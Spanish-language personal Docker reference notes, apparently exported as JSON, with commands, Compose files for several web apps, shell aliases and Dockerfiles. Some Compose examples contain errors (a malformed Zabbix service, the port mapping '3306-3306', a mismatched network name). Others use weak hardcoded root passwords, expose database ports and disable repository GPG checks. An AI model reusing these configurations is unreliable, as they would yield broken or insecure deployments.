interactivo)**\r\n\r\n`docker exec -ti \"nombre-contenedor\"|\"ID-contenedor\" bash`\r\n\r\n- **Ingresar a la terminal de un contenedor -u (usuario) -ti(terminal + interactivo)**\r\n\r\n`docker exec -u \"nombre-usuario\" -ti \"nombre-contenedor\"|\"ID-contenedor\" bash`\r\n\r\n- **Comprobar usuario y hostname dentro de la terminal del contenedor**\r\n\r\n`whoami`\r\n`hostname`\r\n\r\n- **Ver el log de un contenedor en ejecución**\r\n\r\n`docker logs -f \"nombre-contenedor\"`\r\n\r\n- **Ver el consumo hardware de un contenedor**\r\n\r\n`docker stats \"nombre-contenedor\"`\r\n\r\n- **Limitar la RAM de un contenedor**\r\n\r\n`docker run -d -m \"\"cantidad\"[mb|gb]\" --name \"nombre-contenedor\" \"nombre-imagen\"`\r\n\r\n- **Limitar la CPU de un contenedor**\r\n\r\n`docker run -d --cpuset-cpus \"rango-cpus\" --name \"nombre-contenedor\" \"nombre-imagen\"`\r\n\r\n\" rango-cpus = si tenemos 6 CPUs, 0-2 ocuparia: 0, 1 y 2; 3-5 ocuparía 3, 4 y 5\r\n\r\n\" Ver cantidad de CPUs `grep \"model name\" /proc/cpuinfo | wc -l`\r\n\r\n- **Copiar archivos a un contenedor corriendo**\r\n\r\n`docker cp \"archivo|directorio-anfitrion nombre-contenedor:nombre-directorio\"`\r\n\r\n`docker cp \"nombre-contenedor:nombre-directorio archivo|directorio-anfitrion\"`\r\n\r\n- **Guardar el estado de un contenedor en una imagen**\r\n\r\n\" El contenido dentro del volumen no se guarda con la imagen resultante de un commit\r\n\r\n`docker commit \"nombre-contenedor-run\" \"nombre-nueva-imagen\"`\r\n\r\n- **Sobreescribir el CMD de una imagen sin un Dockerfile**\r\n\r\n\" Pasar el cmd al final de la imagen al corer un contenedor con run (al final)\r\n\r\n`docker run -d -p 8080:8080 centos python -m SimpleHTTPServer 8080`\r\n\r\n- **Desctrucción de un contenedor automáticamente**\r\n\r\n\" --rm el contenedor es temporal y una vez que se salga de la sesión debe morir\r\n\r\n`docker run --rm -ti --name \"nombre-contenedor\" \"nombre-imagen\" bash`\r\n\r\n- **Comprobar el tamaño de los archivos/directorios de creación de la imagen**\r\n\r\n`du -shc *`\r\n\r\n## VOLUMES\r\n\r\n- **Volúmenes de host - Caso práctico MySQL**\r\n\r\n```\r\ndocker run -d --name my-db -p 3310:3306 -e \"MYSQL_ROOT_PASSWORD=12345678\" -v d:/1_RubenFGR/1_DevOps/1_Documentacion/Microservicios/Docker/Containers/mysql:/var/lib/mysql mariadb:latest\r\n```\r\n\r\n- **Volúmenes anónimos - Caso práctico MySQL**\r\n\r\n```\r\ndocker run -d --name my-db -p 3310:3306 -e \"MYSQL_ROOT_PASSWORD=12345678\" -v /var/lib/mysql mariadb:latest\r\n```\r\n\r\n- **Crear un volumen**\r\n\r\n```\r\ndocker volume create \"nombre-volumen\"\r\n```\r\n\r\n- **Eliminar un volumen**\r\n\r\n```\r\ndocker volume rm \"nombre-volumen\"\r\n```\r\n\r\n- **Correr un contenedor asignando un volumen ya creado**\r\n\r\n```\r\ndocker run -d --name my-db -p 3310:3306 -e \"MYSQL_ROOT_PASSWORD=12345678\" -v \"my-create-volumen\":/var/lib/mysql mariadb:latest\r\n```\r\n\r\n- **Ver volumes que no están referenciados por ningún contenedor**\r\n\r\n```\r\ndocker volume ls -f dangling=true\r\n```\r\n\r\n- **Eliminar volumnes no referenciados**\r\n\r\n```\r\ndocker volume ls -f dangling=true -q | xargs docker volume rm\r\n```\r\n\r\n- **Guardar datos de MongoDB**\r\n\r\n```\r\ndocker run -d -p 27017:27017 -v \"directorio/volume\":/data/db mongo\r\n```\r\n\r\n- **Guardar datos de Jenkins**\r\n\r\n```sh\r\ndocker run -d --name jenkins -p 8080:8080 -v /home/rubenfgr/jenkins/:/var/jenkins_home jenkins\r\n# ver la contraseña\r\ndocker exec jenkins bash -c \"cat /var/jenkins_home/secrets/initialAdminPassword\"\r\n```\r\n\r\n- **Guardar logs de Nginx**\r\n\r\n```sh\r\ndocker run -d --name my-nginx -p 80:80 -v /home/rubenfgr/nginx/:/var/log/nginx nginx\r\n# Mostrar contenido de ficheros en tiempo real\r\ntail -f nginx/error.log\r\n```\r\n\r\n- **Compartir volumen**\r\n\r\n```sh\r\n# crear un script\r\n#!/bin/bash\r\n\r\nwhile true; do\r\n   echo \"\"p\" $(date +%H:%M:%S) \"/p\"\" \"\" /opt/index.html && \\\r\n   sleep 10\r\ndone\r\n\r\n# Crear el Dockerfile\r\nFROM centos\r\n\r\nCOPY start.sh /start.sh\r\n\r\nRUN chmod +x /start.sh\r\n\r\nCMD /start.sh\r\n\r\n# Construir la imagen del generador\r\n# Ejecutar los contenedores del generador y nginx con volumen compartido\r\ndocker run -v $PWD/common:/opt -d --name gen generador\r\ndocker run -d --name nginx -v $PWD/common:/usr/share/nginx/html -p 80:80 nginx\r\n```\r\n\r\n## DOCUMENT ROOT\r\n\r\n- **Mostrar el directorio root**\r\n\r\n```\r\ndocker info | grep -i root\r\n```\r\n\r\n- **Cambiar el Document Root de Docker**\r\n\r\n`vim /lib/systemd/system/docker.service`\r\n\r\n\" Mover la carpeta de docker /var/lib/docker a \"nueva-localización\"\r\n\r\n\" Editar la linea **_ExecStart=/usr/bin/dockerd --data-root \\\"nueva-localización\\\"_**\r\n\r\n\" Notificar los cambios de un archivo de systemd\r\n\r\n`systemctl daemon-reload`\r\n\r\n\" Reiniciar el servicio de docker para aplicar el cambio realizado\r\n\r\n`systemctl restart docker`\r\n\r\n## NETWORK\r\n\r\n- **Mostrar la IP de docker**\r\n\r\n  ```sh\r\n  ip a | grep docker\r\n  docker run -d nginx\r\n  docker inspect \"nombre-proceso-nginx\"\r\n  docker inspect \"nombre-proceso-nginx\" | less\r\n  ```\r\n\r\n- **Mostrar las redes de docker**\r\n\r\n  ```sh\r\n  docker network ls\r\n  ```\r\n\r\n- **Crear una nueva red**\r\n\r\n  ```sh\r\n  docker network create test-network\r\n  # Personalizada\r\n  docker network create -d bridge --subnet 172.20.10.0/24 --gateway 142.20.10.1 \"nombre-red\"\r\n  ```\r\n\r\n- **Crear un contenedor dentro de una red**\r\n\r\n  ```sh\r\n  docker run --network \"docker-test-network\" -d --name test3 \"nombre-imagen\"\r\n  # Con IP personalizada\r\n  docker run --network \"docker-test-network\" --ip \"IP\" -d --name test3 \"nombre-imagen\"\r\n  ```\r\n\r\n- **Hacer ping de un contenedor a otro en la misma subnet**\r\n\r\n  ```sh\r\n  docker exec \"nombre-contenedor\" bash -c \"ping \"IP\"\"\r\n  # Con nombre solo para redes creadas por nosotros, NO se puede desde \"bridge\" (por defecto)\r\n  docker exec \"nombre-contenedor\" bash -c \"ping \"nombre-contenedor\"\"\r\n  ```\r\n\r\n- **Conectar contenedores en distintas redes**\r\n\r\n  ```sh\r\n  docker network connect \"nombre-red\" \"nombre-contenedor\"\r\n  ```\r\n\r\n- **Desconectar contenedores en distintas redes**\r\n\r\n  ```sh\r\n  docker network disconnect \"nombre-red\" \"nombre-contenedor\"\r\n  ```\r\n\r\n- **Eliminar redes**\r\n\r\n  ```sh\r\n  # Se deben eliminar \"antes\" los contenedores de la misma\r\n  docker network rm\r\n  ```\r\n\r\n- **Conectar un contenedor a la red host**\r\n\r\n  ```sh\r\n  docker run -d --network host --name cont5 -ti debian\r\n  # Este contenedor tendrá los mismos parámetros de red que el host\r\n  ```\r\n\r\n- **Contenedores SIN red - none**\r\n\r\n  ```sh\r\n  docker run --network none --name cont -d -ti debian\r\n  ```\r\n\r\n- **Contenedor en red host con acceso solo desde \"localhost**\r\n\r\n  ```sh\r\n  # Acceso desde localhost y IP local del host\r\n  docker run -d -p 8080:80 nginx\r\n  # Acceso sólo desde localhost\r\n  docker run -d -p 127.0.0.1:8081:80 nginx\r\n  ```\r\n\r\n## DOCKER COMPOSE\r\n\r\n- **Crear un archivo \"docker-compose.yml**\r\n\r\n  ```yml\r\n  version: \"3.8\"\r\n  services:\r\n    web:\r\n      image: nginx\r\n      container_name: nginx1\r\n      ports:\r\n        - \"8080:80\"\r\n      environment:\r\n        - \"MY_ENV=RUBENFGR\"\r\n      #env_file: common.env (rear un archivo de claves/valor)\r\n      volumes:\r\n        - \"vol2:/usr/share/nginx/html\"\r\n      #volumes: (HOST)\r\n      #- '$PWD/HTML:/usr/share/nginx/html'\r\n      networks:\r\n        - net-test\r\n    web2:\r\n      image: nginx\r\n      container_name: nginx2\r\n      ports:\r\n        - \"8081:80\"\r\n      networks:\r\n        - net-test\r\n  volumes:\r\n    vol2:\r\n  networks:\r\n    net-test:\r\n  ```\r\n\r\n  ```sh\r\n  # Iniciar el contenedor con docker-compose\r\n  docker-compose up -d\r\n  # Iniciar especificando el archivo\r\n  docker-compose -f \"my-file\".yml up -d\r\n  # Parar eliminar el contenedor creado\r\n  docker-compose down\r\n  ```\r\n\r\n- **Build docker-compose**\r\n\r\n  1. Crear un Dockerfile\r\n\r\n  ```sh\r\n  FROM debian\r\n\r\n  RUN mkdir /opt/test\r\n  ```\r\n\r\n  2. Crear un docker-compose\r\n\r\n  ```yml\r\n  version: \"3.8\"\r\n  services:\r\n    web:\r\n      container_name: my-web\r\n      image: my-web-test\r\n      build: .\r\n      #build:\r\n      #context: .\r\n      #dockerfile: myDockerfile\r\n  ```\r\n\r\n  3. Correr docker-compose\r\n\r\n  ```sh\r\n  docker-compose build\r\n  ```\r\n\r\n- **Sobreescribir el CMD de un contenedor en compose**\r\n\r\n  ```yml\r\n  version: \"3.8\"\r\n  services:\r\n    web:\r\n      image: debian\r\n      command: python -m SimpleHTTPServer 8080\r\n      ports:\r\n        - \"8080:8080\"\r\n  ```\r\n\r\n- **Limitar los recursos**\r\n\r\n  ```yml\r\n  version: \"3.8\"\r\n  services:\r\n    web:\r\n      container_name: my-nginx\r\n      mem_limit: 20m\r\n      cpuset: \"0\"\r\n      image: nginx\r\n  ```\r\n\r\n- **Reinicio automático del contenedor**\r\n\r\n  1. Crear el docker-compose\r\n\r\n  ```yml\r\n  version: \"3.8\"\r\n  services:\r\n    web:\r\n      container_name: test\r\n      image: restart-image\r\n      build: .\r\n      restart:\r\n        always\r\n        # unless-stopped # Reinicio a menos que se detenga manualmente\r\n        # on-failure # Reinicio a pesar que falle internamente (error distinto de 0)\r\n  ```\r\n\r\n  ```sh\r\n  docker run -d --restart always --name my-test -p 8080:80 nginx\r\n  ```\r\n\r\n  2. Crear el Dockerfile\r\n\r\n  ```\r\n  FROM debian\r\n\r\n  COPY start.sh /start.sh\r\n\r\n  RUN chmod +x /start.sh\r\n\r\n  CMD /start.sh\r\n  ```\r\n\r\n  3. Crear el .sh\r\n\r\n  ```sh\r\n  #!/bin/bash\r\n\r\n  echo \"Estoy vivo\"\r\n  sleep 5s\r\n  echo \"Estoy detenido\"\r\n  # exit 1 (distinto de 0 para 'on-failure')\r\n  ```\r\n\r\n  4. Build, up and show logs & watch\r\n\r\n  ```sh\r\n  docker-compose -f \"file\".yml build\r\n  docker-compose -f \"file\".yml up -d\r\n  docker logs \"container-name\"\r\n  watch docker ps\r\n  ```\r\n\r\n### Compose wordpress\r\n\r\n```yml\r\nversion: \"3.8\"\r\nservices:\r\n  db:\r\n    container_name: my-mysql\r\n    image: mysql:5.7\r\n    volumes:\r\n      - $PWD/data:/var/lib/mysql\r\n    environment:\r\n      MYSQL_ROOT_PASSWORD: 12345678\r\n      MYSQL_DATABASE: wordpress\r\n      MYSQL_USER: wordpress\r\n      MYSQL_PASSWORD: wordpress\r\n    ports:\r\n      - \"3306:3306\"\r\n    networks:\r\n      - my_net\r\n  wordpress:\r\n    container_name: wordpress\r\n    volumes:\r\n      - \"#PWD/html:/var/www/html\"\r\n    depends_on: # Primero se debe crear el container db\r\n      - db\r\n    image: wordpress\r\n    ports:\r\n      - \"80:80\"\r\n    environment:\r\n      WORDPRESS_DB_HOST: db:3306\r\n      WORDPRESS_DB_USER: wordpress\r\n      WORDPRESS_DB_PASSWORD: wordpress\r\n    networks:\r\n      - my_net\r\nnetworks:\r\n  my_test:\r\n```\r\n\r\n### Compose Drupal\r\n\r\n```yml\r\nversion: \"3.8\"\r\nservices:\r\n  drupal:\r\n    volumes:\r\n      - drupal-html:/var/www/html\r\n    image: drupal:8-apache\r\n    ports:\r\n      - 80:80\r\n    networks:\r\n      - net\r\n  postgres:\r\n    image: postgres:10\r\n    environment:\r\n      POSTGRES_PASSWORD: drupal\r\n    volumes:\r\n      - $PWD/data:/var/lib/postgresql/data\r\n    networks:\r\n      - net\r\n  volumes:\r\n    drupal-html:\r\n  networks:\r\n    net:\r\n```\r\n\r\n### Compose Prestashop\r\n\r\n```yml\r\nversion: \"3.8\"\r\n\r\nservices:\r\n  db:\r\n    container_name: ps-mysql\r\n    image: mysql:5.7\r\n    volumes:\r\n      - $PWD/data:/var/lib/mysql\r\n    environment:\r\n      MYSQL_ROOT_PASSWORD: 12345678\r\n      MYSQL_DATABASE: ps\r\n      MYSQL_USER: ps\r\n      MYSQL_PASSWORD: ps\r\n    ports:\r\n      - \"3306-3306\"\r\n    networks:\r\n      - my_net\r\n  ps:\r\n    container_name: ps-web\r\n    volumes:\r\n      - \"$PWD/html:/var/www/html\"\r\n    depends_on:\r\n      - db\r\n    image: prestashop/prestashop\r\n    ports:\r\n      - \"80:80\"\r\n    environment:\r\n      DB_SERVER: db\r\n      DB_USER: ps\r\n      DB_PASSWD: ps\r\n      DB_NAME: ps\r\n    networks:\r\n      - my_net\r\nnetworks:\r\n  my_net:\r\n```\r\n\r\n### Compose Joomla\r\n\r\n```yml\r\nversion: \"3.8\"\r\nservices:\r\n  joomla:\r\n    image: joomla\r\n    depends_on:\r\n      - mysql\r\n    ports:\r\n      - 8080:80\r\n    environment:\r\n      JOOMLA_DB_HOST: mysql\r\n      JOOMLA_DB_PASSWORD: example\r\n  mysql:\r\n    image: mysql:5.7\r\n    environment:\r\n      MYSQL_ROOT_PASSWORD: example\r\n```\r\n\r\n### Compose React E-Commerce\r\n\r\n```yml\r\nversion: \"3.8\"\r\n\r\nservices:\r\n  reaction:\r\n    image: reactioncommerce/reaction\r\n    depends_on:\r\n      - mongo\r\n    ports:\r\n      - \"3000:3000\"\r\n    environment:\r\n      ROOT_URL: \"http://localhost\"\r\n      MONGO_URL: \"mongodb://mongo:27017/reaction\"\r\n    networks:\r\n      - net\r\n  mongo:\r\n    image: mongo\r\n    volumes:\r\n      - $PWD/data:/data/db\r\n    networks:\r\n      - net\r\nnetworks:\r\n  net:\r\n```\r\n\r\n### Compose Guacamole\r\n\r\n```yml\r\nversion: \"3.8\"\r\nservices:\r\n  db:\r\n    container_name: guacamole-db\r\n    networks:\r\n      - net\r\n    image: mysql:5.7\r\n    volumes:\r\n      - ./conf/initdb.sql:/docker-entrypoint-initdb.d/initdb.sql\r\n      - ./data:/var/lib/mysql\r\n    env_file: .env\r\n  daemon:\r\n    container_name: guacamole-daemon\r\n    networks:\r\n      - net\r\n    image: guacamole/guacd\r\n    depends_on:\r\n      - db\r\n  web:\r\n    container_name: guacamole-web\r\n    networks:\r\n      - net\r\n    image: guacamole/guacamole\r\n    env_file: .env\r\n    depends_on:\r\n      - daemon\r\n  proxy:\r\n    container_name: guacamole-proxy\r\n    hostname: guacamole-proxy\r\n    networks:\r\n      - net\r\n    image: nginx\r\n    ports:\r\n      - \"80:80\"\r\n    restart: always\r\n    volumes:\r\n      - $PWD/conf/nginx.conf:/etc/nginx/nginx.conf\r\n    depends_on:\r\n      - web\r\nnetworks:\r\n  net:\r\n    driver: bridge\r\n```\r\n\r\n### Compose Zabbix\r\n\r\n```yml\r\nversion: '3.8'\r\nservices:\r\n   zabbix:\r\n      container_name: zabbix-web\r\n      image: zabbix\r\n      build: .\r\n      volumes:\r\n         - \"$PWD/html:/usr/share/zabbix\"\r\n      ports:\r\n         - \"80:80\"\r\n      networks:\r\n         - net\r\n   db:\r\n   container_name: zabbix-db\r\n   image: mysql: 5.7\r\n   environment:\r\n      MYSQL_ROOT_PASSWORD: 123456\r\n      MYSQL_USER: zabbix\r\n      MYSQL_PASSWORD: zabbix\r\n      MYSQL_DATABASE: zabbix\r\n   volumes:\r\n      - \"$PWD/data:/var/lib/mysql\"\r\n      - \"$PWD/conf/create.sql:/docker-entrypoint-initdb.d/zabbit.sql\" # carga el sql al inicio del contenedor\r\n   ports:\r\n      - \"3306:3306\"\r\n   networks:\r\n      - net\r\nnetworks:\r\n   net:\r\n```\r\n\r\n### Container openssh-server\r\n\r\n```sh\r\nFROM debian\r\n\r\nRUN yum -y install openssh-server sudo\r\n\r\nRUN useradd guacamole && /user/bin/ssh-keygen -A\r\n\r\nWORKDIR /home/guacamole\r\n\r\nCMD /usr/sbin/sshd -D\r\n```\r\n\r\n### Docker Registry\r\n\r\n- **Crear un registry local**\r\n\r\n  1. Crear un directorio \"registry\"\r\n  2. Correr un contenedor\r\n\r\n  ```sh\r\n  docker run -d -p 5000:5000 --name registry -v $PWD/data:/var/lib/registry registry:2\r\n  ```\r\n\r\n  3. Tagear una imagen existente\r\n\r\n  ```sh\r\n  docker tag \"nombre-imagen-existente\":\"tag\" \"host\":\"puerto\"/\"nombre-imagen-registry\":\"tag-imagen-registry\"\r\n  # Example\r\n  docker tag hello-world:latest localhost:5000/hello-world:1.0\r\n  ```\r\n\r\n  4. Eliminar imagenes\r\n\r\n  ```sh\r\n  docker rmi \"nombre-imagen\"\r\n  ```\r\n\r\n  5. Bajar la imagen desde el propio registry local\r\n\r\n  ```sh\r\n  docker pull \"host\":\"port\"/\"imagen-name\"\r\n  # Example\r\n  docker pull localhost:5000/hello-world\r\n  ```\r\n\r\n## Otros\r\n\r\n### Bash\r\n\r\n- **Simular archivos**\r\n\r\n  `fallocate -l 10M /opt/file1`\r\n\r\n### MySQL\r\n\r\n- **Lanzar contenedor MySQL mapeando puerto, con nombre, root-pass, usuario y user-pass**\r\n  `docker run -d -p 3306:3306 --name \"nombre-bd\" -e \"MYSQL_ROOT_PASSWORD=\"pw\"\" -e \"MYSQL_DATABASE=\"nombre-bd\"\" -e \"MYSQL_USER=\"nombre-usuario\"\" -e \"MYSQL_PASSWORD=\"password-usuario\" \"nombre-imagen\"[:\"tag\"]`\r\n\r\n## Errores\r\n\r\n> Solución a resource temporarily unavailable\r\n\r\nCulpable: La función TasksMax Systemd / Linux\r\n\r\n- Prerrequisitos\r\n\r\nsystemd debe ser mayor o igual a 227 (versión 219 para RHEL)\r\nEl kernel de Linux debe ser superior o igual a 4.3 (versión 3.10 para RHEL)\r\nLa salida de systemctl status docker | grep Tasksincluye unLimit\r\nEste problema fue resuelto por Docker EE 17.06.2-ee-7.\r\n\r\n- Solución\r\n\r\n```sh\r\nsudo systemctl set-property docker.service TasksMax=infinity\r\nsudo systemctl daemon-reload\r\nsudo systemctl restart docker\r\n```\r\n",
    "path": "/docker/0referencia"
  },
  {
    "id": 14,
    "title": "#",
    "content": "\r\n```sh\r\n############################################################################\r\n#                                                                          #\r\n#               ------- Useful Docker Aliases --------                     #\r\n#                                                                          #\r\n#     # Installation :                                                     #\r\n#     copy/paste these lines into your .bashrc or .zshrc file or just      #\r\n#     type the following in your current shell to try it out:              #\r\n#                                                                          #\r\n#     # Usage:                                                             #\r\n#     dcu            : docker-compose up -d                                #\r\n#     dcd            : docker-compose down                                 #\r\n#     dex <container>: execute a bash shell inside the RUNNING <container> #\r\n#     di <container> : docker inspect <container>                          #\r\n#     dim            : docker images                                       #\r\n#     dip            : IP addresses of all running containers              #\r\n#     dl <container> : docker logs -f <container>                          #\r\n#     dnames         : names of all running containers                     #\r\n#     dps            : docker ps                                           #\r\n#     dpsa           : docker ps -a                                        #\r\n#     drmc           : remove all exited containers                        #\r\n#     drmid          : remove all dangling images                          #\r\n#     drun <image>   : execute a bash shell in NEW container from <image>  #\r\n#     dsr <container>: stop then remove <container>                        #\r\n#                                                                          #\r\n############################################################################\r\n\r\nfunction dnames-fn {\r\n\tfor ID in `docker ps | awk '{print $1}' | grep -v 'CONTAINER'`\r\n\tdo\r\n    \tdocker inspect $ID | grep Name | head -1 | awk '{print $2}' | sed 's/,//g' | sed 's%/%%g' | sed 's/\"//g'\r\n\tdone\r\n}\r\n\r\nfunction dip-fn {\r\n\techo \"IP addresses of all named running containers\"\r\n\r\n\tfor DOC in `dnames-fn`\r\n\tdo\r\n  \t\tIP=`docker inspect $DOC | grep -m3 IPAddress | cut -d '\"' -f 4 | tr -d \"\\n\"`\r\n  \t\techo $DOC : $IP\r\n\tdone\r\n}\r\n\r\nfunction dex-fn {\r\n\tdocker exec -it $1 /bin/bash\r\n}\r\n\r\nfunction di-fn {\r\n\tdocker inspect $1\r\n}\r\n\r\nfunction dl-fn {\r\n\tdocker logs -f $1\r\n}\r\n\r\nfunction drun-fn {\r\n\tdocker run -it $1 /bin/bash\r\n}\r\n\r\nfunction dsr-fn {\r\n\tdocker stop $1;docker rm $1\r\n}\r\n\r\nalias dcu=\"docker-compose up -d\"\r\nalias dcd=\"docker-compose down\"\r\nalias dex=dex-fn\r\nalias di=di-fn\r\nalias dim=\"docker images\"\r\nalias dip=dip-fn\r\nalias dl=dl-fn\r\nalias dnames=dnames-fn\r\nalias dps=\"docker ps\"\r\nalias dpsa=\"docker ps -a\"\r\nalias drmc=\"docker ps -a -q -f status=exited | xargs docker rm\"\r\nalias drmid=\"docker images -f dangling=true -q | xargs docker rmi\"\r\nalias drun=drun-fn\r\nalias dsr=dsr-fn\r\n```\r\n",
    "path": "/docker/aliases"
  },
  {
    "id": 15,
    "title": "Archivos",
    "content": "\r\n## Apache PHP TLS SSL\r\n\r\n```sh\r\n# Archivos\r\nDockerfile\r\ndocker.csr # Solicitud de firma de certificado\r\ndocker.key # Clave privada del certificado\r\nno-subir.txt # Fichero ignorado por .dockerignore\r\n.dockerignore\r\n/web # Directorio con los ficheros de la página web\r\n```\r\n\r\n- Dockerfile\r\n\r\n  ```sh\r\n  FROM centos:7\r\n\r\n  ENV a a\r\n\r\n  RUN \\\r\n  yum -y install \\\r\n  httpd \\\r\n  php \\\r\n  php-cli \\\r\n  php-common \\\r\n  mod_ssl \\\r\n  openssl\r\n\r\n  RUN echo \"<?php phpinfo(); ?>\" > /var/www/html/hola.php\r\n\r\n  COPY docker.key /docker.key\r\n  COPY docker.csr /docker.csr\r\n  COPY ssl.conf /etc/httpd/conf.d/default.conf\r\n  COPY startbootstrap-grayscale-gh-pages /var/www/html\r\n\r\n  EXPOSE 443\r\n\r\n  CMD apachectl -DFOREGROUND\r\n  ```\r\n\r\n- dockerignore\r\n\r\n  ```sh\r\n  no-subir.txt\r\n  ```\r\n\r\n- SSL Conf\r\n\r\n  ```conf\r\n  <VirtualHost *:443>\r\n  ServerName localhost\r\n  DocumentRoot /var/www/html\r\n  SSLEngine on\r\n  SSLCertificateFile /docker.csr\r\n  SSLCertificateKeyFile /docker.key\r\n  </VirtualHost>\r\n  ```\r\n\r\n- docker.csr\r\n\r\n  ```sh\r\n  # Tu solicitud de certificado .csr\r\n  ```\r\n\r\n- docker.key\r\n\r\n  ```sh\r\n  # Tu clave privada del certificado\r\n  ```\r\n\r\n## Crear usuario\r\n\r\n```sh\r\nFROM centos\r\n\r\nENV prueba 1234\r\n\r\nRUN useradd ricardo\r\n```\r\n\r\n## Buenas prácticas\r\n\r\n```sh\r\nFROM nginx\r\n\r\nENV dir /usr/share/nginx/html/test.txt\r\n\r\nRUN \\\r\n  echo \"1\" >> $dir && \\\r\n  echo \"2\" >> $dir && \\\r\n  echo \"3\" >> $dir\r\n```\r\n\r\n## CentOS systemd\r\n\r\n```sh\r\nFROM centos:latest\r\nENV container docker\r\nRUN (cd /lib/systemd/system/sysinit.target.wants/; for i in *; do [ $i == \\\r\nsystemd-tmpfiles-setup.service ] || rm -f $i; done); \\\r\nrm -f /lib/systemd/system/multi-user.target.wants/*;\\\r\nrm -f /etc/systemd/system/*.wants/*;\\\r\nrm -f /lib/systemd/system/local-fs.target.wants/*; \\\r\nrm -f /lib/systemd/system/sockets.target.wants/*udev*; \\\r\nrm -f /lib/systemd/system/sockets.target.wants/*initctl*; \\\r\nrm -f /lib/systemd/system/basic.target.wants/*;\\\r\nrm -f /lib/systemd/system/anaconda.target.wants/*;\r\nVOLUME [ \"/sys/fs/cgroup\" ]\r\nCMD [\"/usr/sbin/init\"]\r\n```\r\n\r\n## Dockerfile FULL\r\n\r\n```sh\r\n# Archivos\r\nDockerfile\r\n/web # Tus ficheros de la página web\r\n```\r\n\r\n```sh\r\nFROM nginx\r\n\r\nRUN useradd ruperto\r\n\r\nCOPY startbootstrap /usr/share/nginx/html\r\n\r\nENV archivo docker\r\n\r\nWORKDIR /usr/share/neginx/html\r\n\r\nRUN echo \"$archivo\" > /usr/share/nginx/html/env.html\r\n\r\nEXPOSE 90\r\n\r\nLABEL version=1\r\n\r\nUSER ruperto\r\n\r\nRUN echo \"Yo soy $(whoami)\" > /tmp/yo.html\r\n\r\nUSER root\r\n\r\nRUN cp /tmp/yo.html /usr/share/nginx/html/docker.html\r\n\r\nVOLUME /var/log/nginx\r\n\r\nCMD nginx -g 'daemon off;'\r\n```\r\n\r\n## Dockerfile FULL 2\r\n\r\n```sh\r\n# Archivos\r\nDockerfile\r\nrun.sh\r\n/web\r\n```\r\n\r\n- Dockerfile\r\n\r\n  ```sh\r\n  FROM ubuntu:latest\r\n\r\n  LABEL version=1.0\r\n  LABEL descripcion=\"This is an apache image\"\r\n  LABEL vendor=yo\r\n\r\n  RUN apt-get update\r\n\r\n  RUN apt-get install apache2 -y\r\n\r\n  WORKDIR /var/www/html\r\n\r\n  COPY bootstrap .\r\n\r\n  ENV contenido prueba\r\n\r\n  RUN echo \"$contenido\" > /var/www/html/prueba.html\r\n\r\n  RUN echo \"$(whoami)\" > /var/www/html/user1.html\r\n\r\n  RUN useradd ruperto\r\n\r\n  RUN chown ruperto /mnt -R\r\n\r\n  USER ruperto\r\n\r\n  RUN echo \"$(whoami)\" > /mnt/user2.html\r\n\r\n  USER root\r\n\r\n  RUN cp /mnt/user2.html /var/www/html/\r\n\r\n  COPY run.sh /run.sh\r\n\r\n  CMD sh /run.sh\r\n\r\n  ```\r\n\r\n- run.sh\r\n\r\n  ```sh\r\n  #!/bin/bash\r\n\r\n  echo \"Iniciando container...\"\r\n  echo \"INICIADO!!\" > /var/www/html/ini.html\r\n  apachectl -DFOREGROUND\r\n  ```\r\n\r\n## Escenarios múltiples\r\n\r\n```sh\r\nFROM maven:latest as builder\r\n\r\nCOPY app /app # app Java\r\n\r\nRUN cd /app && mvn package\r\n\r\nFROM openjdk:8-alpine\r\n\r\nCOPY --from=builder /app/target/jb-hello-world-maven-0.1.0.jar /opt/app.jar\r\n\r\nCMD java -jar /opt/app.jar\r\n```\r\n\r\n```sh\r\nFROM centos as test\r\n\r\nRUN fallocate -l 10M /opt/file1\r\n\r\nRUN fallocate -l 10M /opt/file2\r\n\r\nRUN fallocate -l 10M /opt/file3\r\n\r\nFROM alpine\r\n\r\nCOPY --from=test /opt/file3 /opt/myfile\r\n```\r\n\r\n## NGINX PHP FPM\r\n\r\n```sh\r\n# Archivos/directorios\r\n/bin\r\n    start.sh\r\n/conf\r\n    nginx.conf\r\n    nginx.repo\r\nDockerfile\r\nindex.php\r\n```\r\n\r\n- start.sh\r\n\r\n```sh\r\n#!/bin/bash\r\n\r\n# Starts php process in background\r\n\r\n/usr/sbin/php-fpm -c /etc/php/fpm\r\n\r\n# Starts nginx daemon\r\n\r\nnginx -g 'daemon off;'\r\n```\r\n\r\n- nginx.conf\r\n\r\n```sh\r\nserver {\r\n  listen       80;\r\n  server_name  localhost;\r\n  root         /var/www/html;\r\n  index        index.php;\r\n  access_log   /var/log/nginx/nginx-access.log;\r\n  error_log    /var/log/nginx/nginx-error.log;\r\n\r\n   gzip on;\r\n   gzip_static on;\r\n   gzip_disable \"msie6\";\r\n   gzip_http_version 1.1;\r\n   gzip_vary on;\r\n   gzip_comp_level 6;\r\n   gzip_proxied any;\r\n   gzip_buffers 16 8k;\r\n   gzip_types\r\n     text/plain\r\n     text/css\r\n     text/x-js\r\n     text/javascript\r\n     application/json\r\n     application/x-javascript\r\n     application/javascript;\r\n\r\n\r\n  location = /favicon.ico {\r\n    log_not_found off;\r\n    access_log off;\r\n  }\r\n\r\n  location = /robots.txt {\r\n    allow all;\r\n    log_not_found off;\r\n    access_log off;\r\n  }\r\n\r\n  location / {\r\n\r\n    try_files $uri $uri/ /index.php?$args;\r\n\r\n  }\r\n\r\n  location ~ \\.php$ {\r\n\r\n    try_files $uri =404;\r\n    include /etc/nginx/fastcgi_params;\r\n    fastcgi_pass 127.0.0.1:9000;\r\n    fastcgi_index index.php;\r\n    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\r\n    fastcgi_param PATH_INFO $fastcgi_script_name;\r\n    fastcgi_intercept_errors on;\r\n\r\n  }\r\n}\r\n```\r\n\r\n- nginx.repo\r\n\r\n```sh\r\n[nginx]\r\nname=nginx repo\r\nbaseurl=http://nginx.org/packages/centos/7/$basearch/\r\ngpgcheck=0\r\nenabled=1\r\n```\r\n\r\n- Dockerfile\r\n\r\n```sh\r\nFROM centos:7\r\n\r\nCOPY ./conf/nginx.repo /etc/yum.repos.d/nginx.repo\r\n\r\nRUN                                                                          \\\r\n  yum -y install nginx --enablerepo=nginx                                 && \\\r\n  yum -y install https://centos7.iuscommunity.org/ius-release.rpm         && \\\r\n  yum -y install                                                             \\\r\n    php71u-fpm                                                               \\\r\n    php71u-cli                                                               \\\r\n    php71u-mysqlnd                                                           \\\r\n    php71u-soap                                                              \\\r\n    php71u-xml                                                               \\\r\n    php71u-zip                                                               \\\r\n    php71u-json                                                              \\\r\n    php71u-mcrypt                                                            